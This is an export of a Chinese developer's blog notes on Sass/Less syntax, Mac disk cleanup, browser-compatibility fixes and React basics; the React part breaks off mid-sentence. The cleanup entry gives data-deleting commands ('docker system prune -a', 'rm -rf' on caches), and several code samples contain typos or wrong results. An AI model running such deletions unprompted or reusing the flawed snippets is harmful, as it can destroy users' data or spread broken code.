class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#main &#123; &amp;-sidebar&#123; color: red &#125;&#125;</span><br><span class="line">#main-sidebar&#123; color: red &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>@minxin, @include</em><br>混合器，实现大段样式的重用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@mixin rounded-corners&#123; border-radius: 5px &#125;</span><br><span class="line">notice&#123; @include rounded-corners &#125;</span><br></pre></td></tr></table></figure><p>混合器传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@mixin link-colors($normal, $hover)&#123;</span><br><span class="line">  color: $normal;</span><br><span class="line">  &amp;:hover&#123; color: $hover &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a&#123; @inclue link-color($normal: blue, $hover: red) &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>%</em><br>占位符选择器，必须使用@extend指令调用。</p></li><li><p><em>@extend</em><br>在设计网页时常常会遇到这样的情况：一个元素使用的样式与另一个元素完全相同，但又添加了额外的样式。我们通常会在HTML中给元素定义两个class，一个通用样式，一个特殊样式。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error seriousError&quot;&gt;Oh! Crash&lt;div&gt;</span><br></pre></td></tr></table></figure><p>使用<code>@extend</code>将一个选择器下的所有样式继承给另一个选择器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.error&#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">.serioutsErro&#123;</span><br><span class="line">  @extend .error;</span><br><span class="line">  border-width: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.hoverlink&#123;</span><br><span class="line">  @extend a:hover</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-其它语法"><a href="#4-其它语法" class="headerlink" title="4. 其它语法"></a>4. 其它语法</h3><ul><li><p><em>!default</em><br>默认变量值，如果这个变量被声明赋值了，那就用声明的值，否则用这个默认值。(很像!important的对立面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7 !default;</span><br></pre></td></tr></table></figure></li><li><p><em>.classA{ @extend .classB }</em><br>使用选择器继承来精简CSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.error&#123; background: red &#125;</span><br><span class="line">.seriousError&#123; @extend .error &#125;</span><br></pre></td></tr></table></figure></li><li><p><em>属性嵌套</em><br>为了便于管理有相同命名空间的属性，sass允许将属性嵌套在命名空间中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  font: &#123;</span><br><span class="line">    size: 14px;</span><br><span class="line">    weight: normal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-SassScript"><a href="#5-SassScript" class="headerlink" title="5. SassScript"></a>5. SassScript</h3><h4 id="5-1-Interactive-Shell"><a href="#5-1-Interactive-Shell" class="headerlink" title="5.1 Interactive Shell"></a>5.1 Interactive Shell</h4><p>SassScript可作用于任何属性，允许属性使用变量、算数运算等额外功能。在命令行中输入<code>sass -i</code>，可以输入想要测试的SassScript查看输出结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sass -i</span><br><span class="line">&gt;&gt; 1px + 1px</span><br><span class="line">2px</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-变量与运算"><a href="#5-2-变量与运算" class="headerlink" title="5.2 变量与运算"></a>5.2 变量与运算</h4><ul><li><p><strong>支持的数据类型</strong><br>数字(10,10px)，字符串，颜色(blue, #fff)，布尔值(true, false)，控制(null)，数组(10px 20px, Arial, sans-serif)，maps(key1: value1, key2: value2)</p></li><li><p><strong>插值语句</strong><br>用<em><code>#{}</code></em>插值语句将变量包裹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name: foo;</span><br><span class="line">p.#&#123;name&#125;&#123;</span><br><span class="line">  color:blue;</span><br><span class="line">&#125;</span><br><span class="line">font-size: $&#123;$font-size&#125;/$&#123;$line-height&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>运算</strong><br><code>width: 10px/8px</code></p></li><li><p><strong>颜色值运算</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#010203 + #040506 = #050709</span><br><span class="line">#010203 * 2 = #020406</span><br><span class="line"></span><br><span class="line">// 必须拥有相同的alpha值才能运算，算术运算不会作用于alpha值</span><br><span class="line">rgba(255,0,0,0.75) + rgba(0,255,0,0.75) = rgba(255,255,0,0.75) </span><br><span class="line"></span><br><span class="line">// alpha值可以通过opacity或transparentize两个函数进行调整</span><br><span class="line">$red: rgba(255,0,0,0.5)</span><br><span class="line">opacity($red, 0.3)           = rgba(255,0,0,0.5)</span><br><span class="line">transparentize($red, 0.25)   = rgba(255,0,0,0.25)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-3-media"><a href="#5-3-media" class="headerlink" title="5.3 @media"></a>5.3 @media</h4><p>@media可以使用SassScript代替条件的名称或值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$media: screen;</span><br><span class="line">$feature: max-width;</span><br><span class="line">$value: 576px;</span><br><span class="line">@media #&#123;$media&#125; and ($feature: $value)&#123;</span><br><span class="line">  .sidebar&#123; width: 500px &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-if"><a href="#5-4-if" class="headerlink" title="5.4 @if"></a>5.4 @if</h4><p>当@if的表达式返回值不是false或null时，条件成立，输出{}内的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$type: monster;</span><br><span class="line">p&#123;</span><br><span class="line">  @if type == ocean&#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125; @else if $type == monster&#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125; @else&#123;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-5-for-each"><a href="#5-5-for-each" class="headerlink" title="5.5 @for, @each"></a>5.5 @for, @each</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@for $i from 1 through 3&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123;</span><br><span class="line">    width: 2em * $i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal in puma, sea-slug, egret, salamander&#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon&#123;</span><br><span class="line">    background: url(&apos;/images/#&#123;$animal&#125;.png&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@each $animal, $color, $cursor in (puma, black, default),</span><br><span class="line">                                  (sea-slug, blue, pointer),</span><br><span class="line">                                  (egret, white, move) &#123;</span><br><span class="line">  .#&#123;$animal&#125;-icon &#123;</span><br><span class="line">    background-image: url(&apos;/images/#&#123;$animal&#125;.png&apos;);</span><br><span class="line">    border: 2px solid $color;</span><br><span class="line">    cursor: $cursor;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-6-while"><a href="#5-6-while" class="headerlink" title="5.6 @while"></a>5.6 @while</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$i: 6;</span><br><span class="line">@while $i&gt;0&#123;</span><br><span class="line">  .item-#&#123;$i&#125;&#123; width: 2em * $i&#125;</span><br><span class="line">  $i: $i -2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-7-function"><a href="#5-7-function" class="headerlink" title="5.7 @function"></a>5.7 @function</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$grid-width: 40px;</span><br><span class="line">$gutter-width: 10px;</span><br><span class="line"></span><br><span class="line">@function grid-width($n)&#123;</span><br><span class="line">  @return $n * $grid-width + ($n - 1) * $gutter-width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar&#123; width: grid-width(5) &#125;</span><br></pre></td></tr></table></figure><h4 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h4><h4 id="6-1-calc在less编译时被计算"><a href="#6-1-calc在less编译时被计算" class="headerlink" title="6.1 calc在less编译时被计算"></a>6.1 calc在less编译时被计算</h4><p><code>{width: calc(100% - 30px)}</code>Less会把这个当成运算式去执行，解析成<code>{width: calc(70%)}</code>。改变写法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&#123; width: calc(~&quot;100% - 30px&quot;)&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mac内存不足</title>
      <link href="/2018/11/06/mac%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/"/>
      <url>/2018/11/06/mac%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/</url>
      <content type="html"><![CDATA[<h4 id="1-清除docker垃圾文件"><a href="#1-清除docker垃圾文件" class="headerlink" title="1. 清除docker垃圾文件"></a>1. 清除docker垃圾文件</h4><p>docker system prune命令可以用于清理磁盘，删除关闭的容器、无用的数据卷和网络，以及dangling镜像(即无tag的镜像)。docker system prune -a命令清理得更加彻底，可以将没有容器使用Docker镜像都删掉。注意，这两个命令会把你暂时关闭的容器，以及暂时没有用到的Docker镜像都删掉了…所以使用之前一定要想清楚吶。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker system prune -a</span><br></pre></td></tr></table></figure></p><h4 id="2-清除APP缓存垃圾"><a href="#2-清除APP缓存垃圾" class="headerlink" title="2. 清除APP缓存垃圾"></a>2. 清除APP缓存垃圾</h4><p>常见目录<code>~/Library/Caches</code>, <code>du -sh *</code>查看所有文件的大小分布, <code>rm -rf</code>删除缓存文件。</p><h4 id="3-windows开机黑屏只有鼠标"><a href="#3-windows开机黑屏只有鼠标" class="headerlink" title="3. windows开机黑屏只有鼠标"></a>3. windows开机黑屏只有鼠标</h4><p>按下键盘<code>Ctrl+Alt+Del</code>组合键，点击任务管理器。点击【文件】，运行【新任务】，输入<code>explorer.ext</code>，点击【以系统管理权限创建此任务】打勾，点击确定。</p>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>浏览器兼容</title>
      <link href="/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/"/>
      <url>/2018/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9/</url>
      <content type="html"><![CDATA[<h4 id="1-设置IE-lt-select-gt-下拉箭头"><a href="#1-设置IE-lt-select-gt-下拉箭头" class="headerlink" title="1. 设置IE&lt;select&gt; 下拉箭头"></a>1. 设置IE<code>&lt;select&gt;</code> 下拉箭头</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span><span class="selector-pseudo">::-ms-expand</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">select</span> &#123;</span><br><span class="line">  <span class="attribute">appearance</span>:none;</span><br><span class="line">  <span class="attribute">-moz-appearance</span>:none;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>:none;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">"http://ourjs.github.io/static/2015/arrow.png"</span>) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/2.png" style="width:250px"><br><br></p><h4 id="2-清除IE-lt-select-gt-选中后的蓝色背景"><a href="#2-清除IE-lt-select-gt-选中后的蓝色背景" class="headerlink" title="2. 清除IE&lt;select&gt;选中后的蓝色背景"></a>2. 清除IE<code>&lt;select&gt;</code>选中后的蓝色背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select::-ms-value&#123;</span><br><span class="line">  background: transparent;</span><br><span class="line">  color: #000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/3.png" style="width:250px"><br><br></p><h4 id="3-去除IE-lt-input-gt-清除按钮"><a href="#3-去除IE-lt-input-gt-清除按钮" class="headerlink" title="3. 去除IE&lt;input&gt;清除按钮"></a>3. 去除IE<code>&lt;input&gt;</code>清除按钮</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input::-ms-clear&#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/1.png" style="width:400px"><br><br></p><h4 id="4-去除chrom浏览器记住密码"><a href="#4-去除chrom浏览器记住密码" class="headerlink" title="4. 去除chrom浏览器记住密码"></a>4. 去除chrom浏览器记住密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;username&quot; autocomplete=&quot;off&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;password&quot; autocomplete=&quot;new-password&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="5-去除-lt-a-gt-点击时的灰色背景"><a href="#5-去除-lt-a-gt-点击时的灰色背景" class="headerlink" title="5. 去除&lt;a&gt;点击时的灰色背景"></a>5. 去除<code>&lt;a&gt;</code>点击时的灰色背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a,a:hover,a:active,a:visited,a:link,a:focus&#123;</span><br><span class="line">  -webkit-tap-highlight-color:rgba(0,0,0,0);</span><br><span class="line">  -webkit-tap-highlight-color: transparent;</span><br><span class="line">  outline:none;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/浏览器兼容/4.png" style="width:250px"><br><br></p><h4 id="6-favicon-ico"><a href="#6-favicon-ico" class="headerlink" title="6. favicon.ico"></a>6. favicon.ico</h4><p>Chrome, firefox请求的是: link的href所对应的图标<br>搜狗浏览器, 360浏览器, qq浏览器请求的是: <code>http://host:3529/favicon.ico</code> 或 <code>http://host/favicon.ico</code> (360浏览器会忽略端口)</p><p><em>如果要让favicon.ico的兼容性更好: 最好放在根目录</em></p><ul><li>检查网站根目录下的favicon.ico, 图标是否正确</li><li>确保使用的是根目录 host/favicon.ico<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;icon&quot; href=&quot;http://host/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="7-绑定事件"><a href="#7-绑定事件" class="headerlink" title="7. 绑定事件"></a>7. 绑定事件</h4><ul><li>IE支持attachEvent, detachEvent</li><li>Chrome和firefox支持addEventListener, removeEventListener<br><br></li></ul><h4 id="8-IE-min-height在flex容器里无效"><a href="#8-IE-min-height在flex容器里无效" class="headerlink" title="8. IE min-height在flex容器里无效"></a>8. IE min-height在flex容器里无效</h4><p>上中下布局，在原有wrapper外添加<em><code>.app{ display: flex }</code></em>。<br>Chorme, Firefox, Safari, IE11, IE10有效 <a href="/2018/11/06/CSS-example/#5-flex-%E4%B8%8A%E4%B8%AD%E4%B8%8B%E5%B8%83%E5%B1%80">具体查看</a></p><p><br></p><h4 id="9-IE-不支持css属性值unset"><a href="#9-IE-不支持css属性值unset" class="headerlink" title="9. IE 不支持css属性值unset"></a>9. IE 不支持css属性值<code>unset</code></h4><p>用<code>initial</code>代替</p><p><br></p><h4 id="10-IE11-flex多列布局-无视border-box"><a href="#10-IE11-flex多列布局-无视border-box" class="headerlink" title="10. IE11 flex多列布局 无视border-box"></a>10. IE11 flex多列布局 无视<code>border-box</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">  padding: 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome, firefox上会挤在一行里，每个<code>item</code>之间有20px的间距。但在IE11下，<code>flex-basis</code>设置的是具体的宽度，它会无视我们设置的<code>box-sizing: border-box;</code>，这时，最后一个元素会溢出容器，显示为两行。<em>解决方法:</em><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span> &gt; <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="undefined">  margin: 0 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="11-去除Safari-input-textarea阴影"><a href="#11-去除Safari-input-textarea阴影" class="headerlink" title="11. 去除Safari input textarea阴影"></a>11. 去除Safari input textarea阴影</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="12-可滚动-lt-div-gt-中padding-bottom无效"><a href="#12-可滚动-lt-div-gt-中padding-bottom无效" class="headerlink" title="12. 可滚动&lt;div&gt;中padding-bottom无效"></a>12. 可滚动<code>&lt;div&gt;</code>中padding-bottom无效</h4><p>给里面的元素添加<code>padding</code>值</p><p><br></p><h4 id="13-js实现base64图片下载"><a href="#13-js实现base64图片下载" class="headerlink" title="13. js实现base64图片下载"></a>13. js实现base64图片下载</h4><p>在IE11中，会报错“传递给系统调用的数据区域太小”。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> imgUrl = <span class="string">'data:image/png;base64,...'</span></span><br><span class="line"><span class="comment">// IE中使用msSaveOrOpenBlob方法（</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">  <span class="keyword">var</span> bstr = atob(imgUrl.split(<span class="string">','</span>)[<span class="number">1</span>])</span><br><span class="line">  <span class="keyword">var</span> n = bstr.length</span><br><span class="line">  <span class="keyword">var</span> u8arr = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(n)</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    u8arr[n] = bstr.charCodeAt(n)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([u8arr])</span><br><span class="line">  <span class="built_in">window</span>.navigator.msSaveOrOpenBlob(blob, <span class="string">'chart-download'</span> + <span class="string">'.'</span> + <span class="string">'png'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 创建a标签，触发点击</span></span><br><span class="line">  <span class="keyword">const</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">  a.href = imgUrl</span><br><span class="line">  a.setAttribute(<span class="string">'download'</span>, <span class="string">'chart-download'</span>)</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a)  <span class="comment">// 兼容firefox，firefox不能下载跨域资源</span></span><br><span class="line">  a.click()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/dodocie/p/7137314.html" target="_blank" rel="noopener">Flex 布局在IE浏览器下的糟糕表现</a></li><li><a href="https://blog.csdn.net/kimbing/article/details/52876953" target="_blank" rel="noopener">Safari中input textarea去除阴影</a></li><li><a href="https://www.jb51.net/article/147431.htm" target="_blank" rel="noopener">纯javascript前端实现base64图片下载(兼容IE10+)</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>React文档</title>
      <link href="/2018/10/25/React%20Docs/"/>
      <url>/2018/10/25/React%20Docs/</url>
      <content type="html"><![CDATA[<h3 id="1-Main-Concept"><a href="#1-Main-Concept" class="headerlink" title="1. Main Concept"></a>1. Main Concept</h3><p>Building blocks of React apps: elements and components. Once you master them, you can create complex apps from small reusable pieces.<br><br></p><h4 id="1-1-Introducting-JSX"><a href="#1-1-Introducting-JSX" class="headerlink" title="1.1 Introducting JSX"></a>1.1 Introducting JSX</h4><p>JSX produces React “elements”.React embraces the fact that rendering logic is inherently coupled with other UI login: how events are handled, how the state changes over time, and how the data is prepared for display.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const name = &apos;Amy&apos;;</span><br><span class="line">const a = &lt;h1&gt;hello world, &#123; name &#125;&lt;/h1&gt;;</span><br><span class="line">const b = &lt;img src=&#123; user.avatarUrl &#125; /&gt;;</span><br></pre></td></tr></table></figure><p>You can put any vaild Javascript expression inside the curly braces in JSX. For example, <code>2+2</code>, <code>user.firstName</code>, or <code>formatName(user)</code> are all valid Javascript expressions.<br><br></p><h4 id="1-2-Rendering-Elements"><a href="#1-2-Rendering-Elements" class="headerlink" title="1.2 Rendering Elements"></a>1.2 Rendering Elements</h4><p>Unlike broswer DOM elements, React elements are plain objects, and are cheap to create. React DOM takes care of updating the DOM to match the React elements.</p><p>React DOM compares the element and its children to the previous one, and only applies the DOM updates necessary to bring the DOM to the desired 